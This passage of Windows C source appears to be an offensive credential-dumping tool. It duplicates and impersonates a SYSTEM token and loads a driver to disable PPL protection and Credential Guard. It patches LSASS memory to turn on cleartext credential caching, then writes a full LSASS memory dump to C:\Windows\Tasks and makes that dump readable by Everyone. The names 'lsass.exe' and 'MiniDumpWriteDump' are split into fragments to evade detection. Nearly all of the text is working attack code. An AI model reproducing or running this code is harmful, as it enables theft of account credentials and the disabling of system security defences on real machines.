    // Read and print current value for g_IsCredGuardEnabled using NtReadVirtualMemory
    ntstatus = NtReadVirtualMemory(hLsass, addrCredGuard, isCredGuardEnabled_buffer, sizeof(isCredGuardEnabled_buffer), &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hLsass != NULL) {
        fprintf(logfile, "[ERROR] NtReadVirtualMemory for isCredGuardEnabled failed: 0x%08X\n", ntstatus);
    }
    else {
        fprintf(logfile, "[+] isCredGuardEnabled value: \t%02X %02X %02X %02X\n",
            isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1],
            isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3]);
    }

    // Patch: Set new value for g_fParameter_UseLogonCredential (enable cleartext credential usage)
    newVal = 1;
    ntstatus = NtWriteVirtualMemory(hLsass, addrUseLogon, &newVal, sizeof(newVal), &bytesWritten);
    if (ntstatus != 0 && hLsass != NULL) {
        fprintf(logfile, "[ERROR] NtWriteVirtualMemory for useLogonCredential failed: 0x%08X\n", ntstatus);
        return 1;
    }

    // Read and print new value for g_fParameter_UseLogonCredential
    ntstatus = NtReadVirtualMemory(hLsass, addrUseLogon, useLogonCredential_buffer, sizeof(useLogonCredential_buffer), &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hLsass != NULL) {
        fprintf(logfile, "[ERROR] NtReadVirtualMemory for useLogonCredential after write failed: 0x%08X\n", ntstatus);
    }
    else {
        fprintf(logfile, "[+] New useLogonCredential value: \t%02X %02X %02X %02X\n",
            useLogonCredential_buffer[0], useLogonCredential_buffer[1],
            useLogonCredential_buffer[2], useLogonCredential_buffer[3]);
    }

    // Patch: Set new value for g_IsCredGuardEnabled (disable Credential Guard)
    newVal = 0;
    ntstatus = NtWriteVirtualMemory(hLsass, addrCredGuard, &newVal, sizeof(newVal), &bytesWritten);
    if (ntstatus != 0 && hLsass != NULL) {
        fprintf(logfile, "[ERROR] NtWriteVirtualMemory for isCredGuardEnabled failed: 0x%08X\n", ntstatus);
        return 1;
    }

    // Read and print new value for g_IsCredGuardEnabled
    ntstatus = NtReadVirtualMemory(hLsass, addrCredGuard, isCredGuardEnabled_buffer, sizeof(isCredGuardEnabled_buffer), &bytesRead);
    if (ntstatus != 0 && ntstatus != 0xC0000005 && ntstatus != 0x8000000D && hLsass != NULL) {
        fprintf(logfile, "[ERROR] NtReadVirtualMemory for isCredGuardEnabled after write failed: 0x%08X\n", ntstatus);
    }
    else {
        fprintf(logfile, "[+] New isCredGuardEnabled value: \t%02X %02X %02X %02X\n",
            isCredGuardEnabled_buffer[0], isCredGuardEnabled_buffer[1],
            isCredGuardEnabled_buffer[2], isCredGuardEnabled_buffer[3]);
    }


    CloseHandle(hLsass);
    fprintf(logfile, "[+] Patch successfully applied.\n");
    return 0;
}

// ==================================
// main
// ==================================

int main(void)
{
    // Logs
    logfile = fopen("C:\\Windows\\Tasks\\log.txt", "a");

    // Initialize STARTUPINFO and PROCESS_INFORMATION structures.
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Duplicazione del token di SYSTEM
    HANDLE hSystemToken = NULL;
    if (!GetSystemTokenAndDuplicate(&hSystemToken)) {
        fprintf(logfile, "[!] Failed to duplicate SYSTEM token.\n");
        return 1;
    }
    fprintf(logfile, "[+] Successfully duplicated SYSTEM token.\n");

    EnableAllPrivileges(hSystemToken);

    // Impersona il token SYSTEM
    if (!ImpersonateLoggedOnUser(hSystemToken)) {
        fprintf(logfile, "[!] ImpersonateLoggedOnUser failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logfile, "[+] Impersonation succeeded.\n");
    }

    if (!SetThreadToken(NULL, hSystemToken)) {
        fprintf(logfile, "[!] SetThreadToken failed, error: %lu\n", GetLastError());
    }
    else {
        fprintf(logfile, "[+] SetThreadToken succeeded. Current thread now uses SYSTEM token.\n");
    }

    // Load the DLLs kernel32.dll and ntdll.dll
    HMODULE hKernel32 = LoadLibraryA("kernel32.dll");
    if (!hKernel32) {
        fprintf(logfile, "Error loading kernel32.dll\n");
        return 1;
    }
    HMODULE hNtdll = LoadLibraryA("ntdll.dll");
    if (!hNtdll) {
        fprintf(logfile, "Error loading ntdll.dll\n");
        return 1;
    }
    HANDLE hDbghelp = LoadCleanDLL("dbghelp.dll");
    if (!hDbghelp) {
        fprintf(logfile, "Error loading ntdll.dll\n");
        return 1;
    }

    // Start the driver
    LoadAndStartDriver();

    // Disable PPL
    disablePPL();

    // Disable Credential Guard
    disableCG();

    // Build the target process name: "lsass.exe"
    wchar_t part1[] = L"ls";
    wchar_t part2[] = L"ass";
    wchar_t part3[] = L".ex";
    wchar_t part4[] = L"e";
    char targetProcessName[50] = { 0 };
    swprintf(targetProcessName, "%s%s%s%s", part1, part2, part3, part4);

    DWORD targetPID = 0;

    // Create a snapshot of active processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        fprintf(logfile, "Unable to create process snapshot.\n");
        return 1;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe))
    {
        do
        {
            if (_stricmp(pe.szExeFile, targetProcessName) == 0)
            {
                targetPID = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (targetPID == 0)
    {
        fprintf(logfile, "Target process not found.\n");
        return 1;
    }

    // Open the target process with full access (requires elevation)
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hProcess)
    {
        fprintf(logfile, "Unable to open target process (PID: %lu).\n", targetPID);
        return 1;
    }

    // Define the dump file path
    const char* dumpFilePath = "C:\\Windows\\tasks\\ssasl.dmp";

    // Create the dump file
    HANDLE hFile = CreateFileA(dumpFilePath,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL);
    if (hFile == INVALID_HANDLE_VALUE)
    {
        fprintf(logfile, "Unable to create dump file.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Build the function name: "MiniDumpWriteDump"
    char mdPart1[] = "Mini";
    char mdPart2[] = "Dump";
    char mdPart3[] = "Write";
    char mdPart4[] = "Dump";
    char miniFuncName[100] = { 0 };
    sprintf(miniFuncName, "%s%s%s%s", mdPart1, mdPart2, mdPart3, mdPart4);

    PFN_MDWD pMiniDumpWriteDump = (PFN_MDWD)GetProcAddress(hDbghelp, miniFuncName);
    if (!pMiniDumpWriteDump)
    {
        fprintf(logfile, "Unable to retrieve MiniDumpWriteDump address.\n");
        FreeLibrary(hDbghelp);
        CloseHandle(hFile);
        CloseHandle(hProcess);
        return 1;
    }

    // Dump the target process
    BOOL dumped = pMiniDumpWriteDump(
        hProcess,               // Handle to target process
        targetPID,              // Process ID
        hFile,                  // Handle to file
        MiniDumpWithFullMemory, // Dump type
        NULL,                   // Exception parameter
        NULL,                   // User stream parameter
        NULL                    // Callback parameter
    );

    if (dumped)
    {
        fprintf(logfile, "[+] Dump completed.\n");
    }
    else
    {
        fprintf(logfile, "[!] Dump failed. Error code: %lu\n", GetLastError());
    }

    // Clean up resources before modifying file permissions
    FreeLibrary(hDbghelp);
    CloseHandle(hFile);
    CloseHandle(hProcess);

    // Set file permissions to grant GENERIC_READ to Everyone
    DWORD dwRes;
    EXPLICIT_ACCESS ea;
    PACL pNewDACL = NULL;

    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
    ea.grfAccessPermissions = GENERIC_READ;
    ea.grfAccessMode = SET_ACCESS;
    ea.grfInheritance = NO_INHERITANCE;
    ea.Trustee.TrusteeForm = TRUSTEE_IS_NAME;
    ea.Trustee.TrusteeType = TRUSTEE_IS_WELL_KNOWN_GROUP;
    ea.Trustee.ptstrName = L"Everyone";

    dwRes = SetEntriesInAcl(1, &ea, NULL, &pNewDACL);
    if (dwRes != ERROR_SUCCESS)
    {
        fprintf(logfile, "Failed to set entries in ACL. Error: %lu\n", dwRes);
    }
    else
    {
        dwRes = SetNamedSecurityInfoA(
            (LPSTR)dumpFilePath,
            SE_FILE_OBJECT,
            DACL_SECURITY_INFORMATION,
            NULL,
            NULL,
            pNewDACL,
            NULL);
        if (dwRes != ERROR_SUCCESS)
        {
            fprintf(logfile, "Failed to set security info. Error: %lu\n", dwRes);
        }
    }
    if (pNewDACL)
        LocalFree(pNewDACL);

    // Unload the driver
    StopAndUnloadDriver(DRIVER_NAME);

    fclose(logfile);

    return 0;
}
